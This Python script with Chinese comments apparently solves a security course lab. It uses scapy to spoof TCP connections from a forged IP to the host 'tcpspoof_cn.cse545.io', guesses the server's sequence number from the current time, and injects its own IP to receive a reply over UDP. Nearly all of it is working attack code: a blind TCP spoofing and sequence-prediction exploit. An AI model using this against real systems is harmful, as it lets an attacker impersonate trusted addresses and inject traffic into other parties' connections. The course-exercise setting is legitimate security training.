# -*- coding: utf-8 -*-
import time
from scapy.all import RandShort, RandInt, sr1, send
from scapy.layers.inet import IP, TCP
import socket
import _thread
import random

DHOST = 'tcpspoof_cn.cse545.io'
FAKEIP = '10.2.4.10'
DPORT = 13337
# SPORT = RandShort()
SPORT = 23337
SIP = '172.16.20.23'

ss_ack = 1
ss_ack = 0
dd_seq = 0
WORKING = 1


# 根据时间猜测SEQ
def guessSEQ():
    global ss_ack, dd_seq
    num = int(time.time())
    bs = num.to_bytes(length=4, byteorder='big', signed=False)
    n = []
    for i in bs:
        n.append(i)
    for i in range(0, 10):  # 随机打乱个字节，进行重新排序
        idx = random.randint(10, 1000) % 3 + 1  # 生成1-4随机数
        n[0] += n[idx]
        n[idx] = n[0] - n[idx]
        n[0] = n[0] - n[idx]
    bs = bytes(n)
    return int.from_bytes(bs, byteorder='big', signed=False) + 1


# 建立链接
def connect():
    global ss_ack, dd_seq
    try:
        # 第一次握手，发送SYN包
        send(IP(dst=DHOST, src=FAKEIP) / TCP(dport=DPORT, sport=SPORT, seq=0, flags='S'), verbose=False)
        ss_ack = 1
        dd_seq = guessSEQ()  # 根据时间猜测SEQ
        # 第三次握手，发送ACK确认包
        pk = IP(dst=DHOST, src=FAKEIP) / TCP(dport=DPORT, sport=SPORT, ack=dd_seq, seq=ss_ack, flags='A')
        # print(pk.show())
        send(pk, verbose=False)
    except Exception as e:
        print('[-]有错误，请注意检查！')
        print(e)


# TCP链接建立后发送本地IP
def sendData():
    global ss_ack, dd_seq
    pk = IP(dst=DHOST, src=FAKEIP) / TCP(dport=DPORT, sport=SPORT, seq=ss_ack, ack=dd_seq, flags=24) / SIP
    # print(pk.show())
    send(pk)


# 创建UDP Server接收数据
def receive():
    global WORKING
    IPv4 = "0.0.0.0"
    Port = 13337
    ServerSock = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)  # UDP
    ServerSock.bind((IPv4, Port))
    print("Socket is ready to receive data..")
    while True:
        data, addr = ServerSock.recvfrom(1024)  # buffer size is 1024 bytes
        print("received data:", data)
        WORKING = 0


if __name__ == '__main__':
    # getseq()
    # sendData()
    _thread.start_new_thread(receive)
    while WORKING == 1:
        connect()
